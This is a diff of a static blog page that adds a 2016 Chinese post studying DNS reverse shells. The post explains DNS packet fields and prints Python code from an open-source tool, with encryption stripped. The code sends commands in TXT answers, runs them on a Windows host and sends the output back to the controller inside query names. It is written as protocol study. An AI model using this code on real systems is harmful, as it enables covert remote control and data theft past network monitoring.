@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>Tag: 爆破 | 零の杂货铺</title>
+  <title>也说DNS反弹Shell | 零の杂货铺</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -86,7 +86,7 @@
 </head>
 
 <!--
-<body class="home-template">
+<body class="post-template">
 -->
 <body id="index" class="lightnav animsition">
 
@@ -270,37 +270,162 @@
 
         <!-- ============================ END Hero Image =========================== -->
       
-
-
-<section id="services">
+<section id="intro">
     <div class="container">
-        <div class="row">
-            <div class="col-md-10 col-md-offset-1">
-                <div class="row boxes">
-                    
-                    
-                        
-                        
-                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
-                            
-                              <h4 class="title"><a href="/2016/03/25/Bruter/">爆破工具Bruter文档翻译</a></h4>
-                            
-                            <p><time datetime="2016-03-25T01:54:43.000Z"><a href="/2016/03/25/Bruter/">2016-03-25</a></time></p>
-                        </div>
-                    
-                </div>
-            </div>    
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2016-08-11T12:03:39.000Z" itemprop="datePublished">
+          2016-08-11
+      </time>
+    
+    
+    | 
+    <a href='/tags/DNS/'>DNS</a>,
+    
+    <a href='/tags/协议分析/'>协议分析</a>
+    
+    
+</span>
+                <h1>也说DNS反弹Shell</h1>
+            </div>
         </div>
-    </div>
-</section> 
+        <div class="col-md-8 col-md-offset-2">
+      		<p>我们就是喜欢在正常的位置放进去一些奇怪的东西。</p>
+<a id="more"></a>
+<h2 id="0x01-引子"><a href="#0x01-引子" class="headerlink" title="0x01 引子"></a>0x01 引子</h2><p>反弹Shell广泛应用于远程控制下的权限维持，通过反转攻（客户端）和受（服务端）的角色，来实现条件限制，尤其是内网情况下的远程连接。</p>
+<p>反弹Shell的工具和实现方法多种多样，只要能够让被控端通过网络发送数据到控制端，并且实现数据的解析即可完成控制过程。</p>
+<p>最近在继续了解网络协议，于是突然想在DNS数据包中插入一些伪造的命令来实现解析，本来准备自己尝试写一个DNS服务器和DNS请求程序来实现反弹，不过刚动笔就看到了别人开源的程序，于是直接使用别人的程序来学习了。</p>
+<p><a href="https://github.com/ahhh/Reverse_DNS_Shell" target="_blank" rel="external">https://github.com/ahhh/Reverse_DNS_Shell</a></p>
+<p>为了运行测试更方便，去掉了程序中的加解密功能，额外的Python包只需要dns和dnslib</p>
+<h2 id="0x02-DNS"><a href="#0x02-DNS" class="headerlink" title="0x02 DNS"></a>0x02 DNS</h2><p>为了关联主机和IP地址对应关系而诞生的DNS本身，不需要我在这里赘述了。跳过域名构成、查询过程等可以轻松在网络查询到的内容，我们直接来看看DNS的包构成</p>
+<p><img src="http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160811202642.png" alt=""></p>
+<p>在smtp那篇文章中，我们提过一层一层洋葱状的协议包裹，在这里，我们跳过以太、IP、UDP头，直接到DNS数据的部分。</p>
+<ul>
+<li>标志着数据开始的是Tran ID段，所有的问答信息都需要一定的机制来保证对应，这部分应该就是对应机制中的一部分。</li>
+</ul>
+<ul>
+<li>紧接着的Flags，0x0100表明了一些查询属性。</li>
+</ul>
+<ul>
+<li>Queries中是我们所要查询的host，查询类型。作为A类型查询，得到的是host的IP，这里也是我们做手脚的地方，不过TXT类型可以插入一些附加的信息，更适合我们用来构造命令语句。</li>
+</ul>
+<p>服务器回应包如下：</p>
+<p><img src="http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160812100828.png" alt=""></p>
+<ul>
+<li>作为回应的Tran ID，它和查询包相同。</li>
+</ul>
+<ul>
+<li>Flags中标准回应标志位</li>
+</ul>
+<ul>
+<li>重复显示的Queries</li>
+</ul>
+<ul>
+<li>回应的Answers信息。通过CNAME查取主机规范名，再通过规范名查取对应IP。</li>
+</ul>
+<p>利用这种相互应答的特性，我们初步计划通过以下流程来实现我们的反弹Shell</p>
+<pre><code>被控端：  发送DNS请求——&gt;  接收回应并解析执行命令  ——&gt;   发送DNS请求
+              |                    /|\               |
+              |                     |                |
+              |                     |                |
+             \|/                    |               \|/
+控制端： 接收DNS请求并解析命令回显——发送添加了命令的回应——接收DNS并解析命令
+</code></pre><h2 id="0x03-程序"><a href="#0x03-程序" class="headerlink" title="0x03 程序"></a>0x03 程序</h2><p>原始的程序可以在上面的github中找到，这里贴出我们去掉加解密的部分程序。</p>
+<p>先说DNS服务器的部分</p>
+<pre><code>def spawnShell(answer, payload):
+  shellInput = raw_input(PROMPT)
+  if shellInput == &apos;quit&apos;: EXIT = 1 
+  if shellInput == &apos;&apos;: spawnShell(answer, payload) 
+  out = base64.b64encode(shellInput)
+  answer.add_answer(
+     *dnslib.RR.fromZone(&apos;{}.com 60 TXT &quot;{}&quot;&apos;.format(payload, out)))
+  return answer
+</code></pre><p>这一部分封装了对DNS的应答，payload里是被控端发来的查询信息，也就是上一次命令执行后的回显，而out是我们这一次的命令，封装成了TXT的应答包</p>
+<pre><code>def recievePayload(udps):
+  data, addr = udps.recvfrom(1024)
+  dnsD = dnslib.DNSRecord.parse(data)
+  payload = dnsD.questions[0].qname.label[0]
+  answer = dnsD.reply()
+  return addr, payload, answer
+</code></pre><p>这部分对于被控端的查询包进行解析，从中获取到地址和数据，对于数据，解析出其中的命令回显，并且初始化一个应答包。</p>
+<p>主函数中使用socket监听相关端口，对于监听到的包按照预定流程进行处理。</p>
+<p>再来看看被控端发送的部分</p>
+<pre><code>def start(host):
+  while 1:
+    a = startConnection(host)
+    cmd = parseCmd(a)
+    stdoutput = runCmd(cmd)
+    sendOutputToServer(stdoutput, host)
+</code></pre><p>首先是整个流程一览，从程序中可以很清晰的看到建立连接，解析命令，执行命令，发送回显的过程。</p>
+<pre><code>def startConnection(host):
+  url = formURL(nextCommand)
+  request = dns.message.make_query(url, dns.rdatatype.TXT)
+  answers = dns.query.udp(request, host)
+  a = answers.to_text()
+  return a
+</code></pre><p>构造的url，也就是命令回显，对于没有命令的，会返回nxt。利用回显构造查询语句。</p>
+<pre><code>def parseCmd(a):
+def runCmd(cmd)
+</code></pre><p>这两段程序对于收到的文本格式的命令进行解析和执行，没有太多的东西可以讲。只是注意格式的截取，并且考虑对Linux和Windows的命令之间转换。</p>
+<pre><code>def sendOutputToServer(output, host):
+  send =&apos;&apos;
+  output_end = len(output)
+  for chunk in output:
+    send += chunk
+    output_end -= 1
+    if len(send) == 58:
+      url = formURL(send)
+      dnsMakeQuery(url, host)
+      send =&apos;&apos;
+    if output_end == 0:
+      url = formURL(send)
+      dnsMakeQuery(url, host)
+</code></pre><p>这部分负责发送DNS查询，按照与服务器约定的格式构造包并且进行发送。</p>
+<h2 id="0x04-测试"><a href="#0x04-测试" class="headerlink" title="0x04 测试"></a>0x04 测试</h2><p>我们需要先执行服务器端程序，然后执行被控端程序。我的服务端程序在一台Ubuntu主机上，被控端在我的Win10机器上。</p>
+<p><img src="http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160813121502.png" alt=""></p>
+<p>如图，是在Ubuntu上对Win10执行ipconfig命令的显示。</p>
+<p>我们再进行抓包分析：</p>
+<p><img src="http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160813121742.png" alt=""></p>
+<p>这是被控端第一次连接时发送的包，因为控制端还没有指令，第一次连接发送的是空包，其中Name的值bnh0就是我之前所说的NXT</p>
+<p><img src="http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160813121858.png" alt=""></p>
+<p>而第二个包就是控制端发送的指令，在TXT中发送的就是指令whoami的base64编码，</p>
+<p>可以对比和我之前实际抓包的不同之处，对照可以看出我们在DNS包的哪些地方做过修改。</p>
+<h2 id="0x05-延伸"><a href="#0x05-延伸" class="headerlink" title="0x05 延伸"></a>0x05 延伸</h2><p>其实相关的DNS隧道技术原理应该差不多，都是在本来应该放DNS规定信息的地方放入了其他的东西，来达到一些意想不到的结果。</p>
+<p>当然，RFC还有许多协议可以让我随意构造去做测试，下一步考虑写一个多协议支持的Fuzzing工具   ：）</p>
 
-<section id="statement">
-    <div class="container text-center wow fadeInUp" data-wow-delay="0.5s">
-        <div class="row">
-            <p>Free and Share。</p>
+            <div class="clearfix"></div>
+            <hr class="nogutter">
         </div>
+        <nav class="pagination" role="pagination">
+    
+    
+    <a class="pull-right" href="/2016/08/08/Remastersys/">
+        Ubuntu服务器下Remastersys系统打包 →
+    </a>
+    
+</nav>
+
+        <div class="duoshuo">
+<div class="ds-thread" data-thread-key="2016/08/11/DNSshell/" data-title="也说DNS反弹Shell" data-url="http://phantom0301.github.io/2016/08/11/DNSshell/"></div>
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"phantom0301"};
+(function() {
+	var ds = document.createElement('script');
+	ds.type = 'text/javascript';ds.async = true;
+	ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+	ds.charset = 'UTF-8';
+	(document.getElementsByTagName('head')[0] 
+	 || document.getElementsByTagName('body')[0]).appendChild(ds);
+})();
+</script>
+
+
+</div>
     </div>
 </section>
+
+
       
 <!-- ============================ Footer =========================== -->
 
